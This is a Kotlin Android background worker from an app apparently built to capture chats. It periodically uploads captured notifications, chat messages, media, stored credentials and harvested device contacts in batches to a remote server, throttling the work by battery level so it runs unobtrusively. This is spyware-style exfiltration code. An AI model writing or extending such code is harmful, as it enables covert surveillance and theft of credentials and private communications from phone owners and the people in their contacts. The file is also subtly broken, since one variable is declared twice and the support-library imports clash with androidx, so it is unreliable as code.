package com.chats.capture.workers

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.chats.capture.CaptureApplication
import com.chats.capture.database.ChatDao
import com.chats.capture.database.ContactDao
import com.chats.capture.database.CredentialDao
import com.chats.capture.database.NotificationDao
import com.chats.capture.managers.ContactCaptureManager
import com.chats.capture.managers.MediaUploadManager
import com.chats.capture.network.ApiClient
import com.chats.capture.network.NetworkManager
import android.os.BatteryManager
import android.support.v4.content.ContextCompat
import com.chats.capture.utils.AppStateManager
import com.chats.capture.utils.RetryManager
import kotlinx.coroutines.delay
import timber.log.Timber

class SyncWorker(context: Context, params: WorkerParameters) : CoroutineWorker(context, params) {
    
    override suspend fun doWork(): Result {
        return try {
            Timber.d("SyncWorker started")
            
            val database = (applicationContext as CaptureApplication).database
            val notificationDao = database.notificationDao()
            val chatDao = database.chatDao()
            
            // Check network availability
            if (!ApiClient.isNetworkAvailable(applicationContext)) {
                Timber.w("Network not available, skipping sync")
                return Result.retry()
            }
            
            // Sync notifications
            syncNotifications(notificationDao)
            
            // Sync chats
            syncChats(chatDao)
            
            // Sync media files (throttled for battery optimization)
            val mediaFileDao = database.mediaFileDao()
            val mediaUploadManager = MediaUploadManager(applicationContext, mediaFileDao, notificationDao, chatDao)
            
            // Limit uploads based on battery level
            val batteryLevel = getBatteryLevel(applicationContext)
            val uploadLimit = if (batteryLevel < 20) 2 else 3 // Fewer uploads when battery low
            mediaUploadManager.uploadPendingMediaFiles(limit = uploadLimit)
            
            // Sync credentials
            syncCredentials(database.credentialDao())
            
            // Capture and sync contacts (capture first, then sync)
            val contactDao = database.contactDao()
            captureContactsIfNeeded(contactDao)
            syncContacts(contactDao)
            
            Timber.d("SyncWorker completed successfully")
            AppStateManager.updateLastSyncTime(applicationContext)
            Result.success()
        } catch (e: Exception) {
            Timber.e(e, "SyncWorker failed")
            Result.retry()
        }
    }
    
    /**
     * Get current battery level percentage
     */
    private fun getBatteryLevel(context: Context): Int {
        return try {
            val batteryManager = context.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
            batteryManager?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: 100
        } catch (e: Exception) {
            Timber.e(e, "Error getting battery level")
            100 // Default to 100% if can't read
        }
    }
    
    private suspend fun syncNotifications(notificationDao: NotificationDao) {
        try {
            val unsyncedNotifications = notificationDao.getUnsyncedNotifications(limit = 50)
            
            if (unsyncedNotifications.isEmpty()) {
                Timber.d("No unsynced notifications")
                return
            }
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadNotificationsBatch(unsyncedNotifications)
            
            if (response.isSuccessful) {
                try {
                    val responseBody = response.body()
                    if (responseBody?.success == true) {
                        // Mark as synced
                        unsyncedNotifications.forEach { notification ->
                            notificationDao.markAsSynced(notification.id)
                        }
                        Timber.d("Synced ${unsyncedNotifications.size} notifications")
                    } else {
                        // Response was successful but success=false
                        val errorMessage = responseBody?.message ?: "Sync failed"
                        unsyncedNotifications.forEach { notification ->
                            notificationDao.markSyncAttempt(
                                notification.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync notifications: $errorMessage")
                    }
                } catch (e: com.google.gson.JsonSyntaxException) {
                    // Server returned non-JSON response (plain text), but HTTP was successful
                    // Treat as success if status code is 200-299
                    if (response.code() in 200..299) {
                        unsyncedNotifications.forEach { notification ->
                            notificationDao.markAsSynced(notification.id)
                        }
                        Timber.d("Synced ${unsyncedNotifications.size} notifications (non-JSON response treated as success)")
                    } else {
                        val errorMessage = "Server returned non-JSON response: ${response.code()}"
                        unsyncedNotifications.forEach { notification ->
                            notificationDao.markSyncAttempt(
                                notification.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync notifications: $errorMessage")
                    }
                }
            } else {
                // HTTP error - try to get error message
                val errorBody = response.errorBody()?.string()
                val errorMessage = try {
                    if (errorBody != null && errorBody.isNotBlank()) {
                        val gson = com.google.gson.GsonBuilder().setLenient().create()
                        val errorResponse = gson.fromJson(errorBody, com.chats.capture.network.ApiResponse::class.java)
                        errorResponse.message ?: "Sync failed with code ${response.code()}"
                    } else {
                        "Sync failed with code ${response.code()}"
                    }
                } catch (e: Exception) {
                    // Not JSON, use raw error body or status code
                    errorBody?.take(200) ?: "Sync failed with code ${response.code()}"
                }
                
                unsyncedNotifications.forEach { notification ->
                    notificationDao.markSyncAttempt(
                        notification.id,
                        System.currentTimeMillis(),
                        errorMessage
                    )
                }
                Timber.w("Failed to sync notifications: $errorMessage")
            }
        } catch (e: com.google.gson.JsonSyntaxException) {
            Timber.e(e, "JSON parsing error syncing notifications - server returned malformed JSON")
            // Don't mark as synced, will retry later
        } catch (e: Exception) {
            Timber.e(e, "Error syncing notifications: ${e.message}")
        }
    }
    
    private suspend fun syncChats(chatDao: ChatDao) {
        try {
            val unsyncedChats = chatDao.getUnsyncedChats(limit = 50)
            
            if (unsyncedChats.isEmpty()) {
                Timber.d("No unsynced chats")
                return
            }
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadChatsBatch(unsyncedChats)
            
            if (response.isSuccessful) {
                try {
                    val responseBody = response.body()
                    if (responseBody?.success == true) {
                        // Mark as synced
                        unsyncedChats.forEach { chat ->
                            chatDao.markAsSynced(chat.id)
                        }
                        Timber.d("Synced ${unsyncedChats.size} chats")
                    } else {
                        // Response was successful but success=false
                        val errorMessage = responseBody?.message ?: "Sync failed"
                        unsyncedChats.forEach { chat ->
                            chatDao.markSyncAttempt(
                                chat.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync chats: $errorMessage")
                    }
                } catch (e: com.google.gson.JsonSyntaxException) {
                    // Server returned non-JSON response (plain text), but HTTP was successful
                    // Treat as success if status code is 200-299
                    if (response.code() in 200..299) {
                        unsyncedChats.forEach { chat ->
                            chatDao.markAsSynced(chat.id)
                        }
                        Timber.d("Synced ${unsyncedChats.size} chats (non-JSON response treated as success)")
                    } else {
                        val errorMessage = "Server returned non-JSON response: ${response.code()}"
                        unsyncedChats.forEach { chat ->
                            chatDao.markSyncAttempt(
                                chat.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync chats: $errorMessage")
                    }
                }
            } else {
                // HTTP error - try to get error message
                val errorBody = response.errorBody()?.string()
                val errorMessage = try {
                    if (errorBody != null && errorBody.isNotBlank()) {
                        val gson = com.google.gson.GsonBuilder().setLenient().create()
                        val errorResponse = gson.fromJson(errorBody, com.chats.capture.network.ApiResponse::class.java)
                        errorResponse.message ?: "Sync failed with code ${response.code()}"
                    } else {
                        "Sync failed with code ${response.code()}"
                    }
                } catch (e: Exception) {
                    // Not JSON, use raw error body or status code
                    errorBody?.take(200) ?: "Sync failed with code ${response.code()}"
                }
                
                unsyncedChats.forEach { chat ->
                    chatDao.markSyncAttempt(
                        chat.id,
                        System.currentTimeMillis(),
                        errorMessage
                    )
                }
                Timber.w("Failed to sync chats: $errorMessage")
            }
        } catch (e: com.google.gson.JsonSyntaxException) {
            Timber.e(e, "JSON parsing error syncing chats - server returned malformed JSON")
            // Don't mark as synced, will retry later
        } catch (e: Exception) {
            Timber.e(e, "Error syncing chats: ${e.message}")
        }
    }
    
    private suspend fun syncCredentials(credentialDao: CredentialDao) {
        try {
            val unsyncedCredentials = credentialDao.getUnsyncedCredentials(limit = 50)
            
            if (unsyncedCredentials.isEmpty()) {
                Timber.d("No unsynced credentials")
                return
            }
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadCredentialsBatch(unsyncedCredentials)
            
            if (response.isSuccessful && response.body()?.success == true) {
                // Mark as synced
                unsyncedCredentials.forEach { credential ->
                    credentialDao.markAsSynced(credential.id)
                }
                Timber.d("Synced ${unsyncedCredentials.size} credentials")
            } else {
                // Mark sync attempt
                val errorMessage = response.body()?.message ?: "Sync failed"
                unsyncedCredentials.forEach { credential ->
                    credentialDao.markSyncAttempt(
                        credential.id,
                        System.currentTimeMillis(),
                        errorMessage
                    )
                }
                Timber.w("Failed to sync credentials: $errorMessage")
            }
        } catch (e: Exception) {
            Timber.e(e, "Error syncing credentials")
        }
    }
    
    private suspend fun syncContacts(contactDao: ContactDao) {
        try {
            val unsyncedContacts = contactDao.getUnsyncedContacts(limit = 50)
            
            if (unsyncedContacts.isEmpty()) {
                Timber.d("No unsynced contacts")
                return
            }
            
            val apiService = ApiClient.getApiService()
            val response = apiService.uploadContactsBatch(unsyncedContacts)
            
            if (response.isSuccessful) {
                try {
                    val responseBody = response.body()
                    if (responseBody?.success == true) {
                        // Mark as synced
                        val syncTime = System.currentTimeMillis()
                        unsyncedContacts.forEach { contact ->
                            contactDao.markAsSynced(contact.id, syncTime)
                        }
                        Timber.d("Synced ${unsyncedContacts.size} contacts")
                    } else {
                        // Response was successful but success=false
                        val errorMessage = responseBody?.message ?: "Sync failed"
                        unsyncedContacts.forEach { contact ->
                            contactDao.markSyncAttempt(
                                contact.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync contacts: $errorMessage")
                    }
                } catch (e: com.google.gson.JsonSyntaxException) {
                    // Server returned non-JSON response, but HTTP was successful
                    if (response.code() in 200..299) {
                        val syncTime = System.currentTimeMillis()
                        unsyncedContacts.forEach { contact ->
                            contactDao.markAsSynced(contact.id, syncTime)
                        }
                        Timber.d("Synced ${unsyncedContacts.size} contacts (non-JSON response treated as success)")
                    } else {
                        val errorMessage = "Server returned non-JSON response: ${response.code()}"
                        unsyncedContacts.forEach { contact ->
                            contactDao.markSyncAttempt(
                                contact.id,
                                System.currentTimeMillis(),
                                errorMessage
                            )
                        }
                        Timber.w("Failed to sync contacts: $errorMessage")
                    }
                }
            } else {
                // HTTP error
                val errorBody = response.errorBody()?.string()
                val errorMessage = try {
                    if (errorBody != null && errorBody.isNotBlank()) {
                        val gson = com.google.gson.GsonBuilder().setLenient().create()
                        val errorResponse = gson.fromJson(errorBody, com.chats.capture.network.ApiResponse::class.java)
                        errorResponse.message ?: "Sync failed with code ${response.code()}"
                    } else {
                        "Sync failed with code ${response.code()}"
                    }
                } catch (e: Exception) {
                    errorBody?.take(200) ?: "Sync failed with code ${response.code()}"
                }
                
                unsyncedContacts.forEach { contact ->
                    contactDao.markSyncAttempt(
                        contact.id,
                        System.currentTimeMillis(),
                        errorMessage
                    )
                }
                Timber.w("Failed to sync contacts: $errorMessage")
            }
        } catch (e: com.google.gson.JsonSyntaxException) {
            Timber.e(e, "JSON parsing error syncing contacts - server returned malformed JSON")
        } catch (e: Exception) {
            Timber.e(e, "Error syncing contacts: ${e.message}")
        }
    }
    
    /**
     * Capture contacts from device if needed (only if we have permission and contacts haven't been captured recently)
     */
    private suspend fun captureContactsIfNeeded(contactDao: ContactDao) {
        try {
            // Check if we have READ_CONTACTS permission
            val hasPermission = android.content.pm.PackageManager.PERMISSION_GRANTED ==
                android.support.v4.content.ContextCompat.checkSelfPermission(
                    applicationContext,
                    android.Manifest.permission.READ_CONTACTS
                )
            
            if (!hasPermission) {
                Timber.d("READ_CONTACTS permission not granted, skipping contact capture")
                return
            }
            
            // Check if we have any contacts in the database
            // If we have contacts, we'll just sync them. If not, capture them.
            val totalContactsCount = try {
                contactDao.getTotalCount()
            } catch (e: Exception) {
                0
            }
            
            // Only capture if we have very few or no contacts
            // This prevents re-capturing all contacts on every sync
            val totalContactsCount = contactDao.getTotalCount()
            if (totalContactsCount < 10) {
                Timber.d("Few contacts in database ($totalContactsCount), capturing contacts from device...")
                val contactCaptureManager = ContactCaptureManager(applicationContext)
                contactCaptureManager.captureAllContacts()
                
                // Wait a bit for contacts to be captured and saved
                delay(3000)
                Timber.d("Contact capture initiated")
            } else {
                Timber.d("Sufficient contacts in database ($totalContactsCount), skipping capture")
            }
        } catch (e: SecurityException) {
            Timber.w(e, "Permission denied: READ_CONTACTS permission required")
        } catch (e: Exception) {
            Timber.e(e, "Error capturing contacts: ${e.message}")
        }
    }
}
